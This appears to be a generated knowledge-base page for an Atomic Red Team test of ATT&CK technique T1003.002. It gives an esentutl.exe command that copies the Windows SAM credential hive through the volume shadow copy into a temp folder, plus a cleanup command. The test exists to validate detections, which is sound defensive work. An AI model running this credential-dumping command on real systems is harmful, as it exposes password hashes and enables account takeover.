---
atomic_guid: "a90c2f4d-6726-444e-99d2-a00cd7c20480"
title: "esentutl.exe SAM copy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "a90c2f4d-6726-444e-99d2-a00cd7c20480"
  - "esentutl.exe SAM copy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003002-security-account-manager|T1003.002: Security Account Manager]]

## Input Arguments

### copy_dest

- description: Destination of the copied file
- type: string
- default: %temp%

### file_name

- description: Name of the copied file
- type: string
- default: SAM

### file_path

- description: Path to the file to copy
- type: path
- default: %SystemRoot%/system32/config/SAM

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
```

### Cleanup

```cmd
del #{copy_dest}\#{file_name} >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
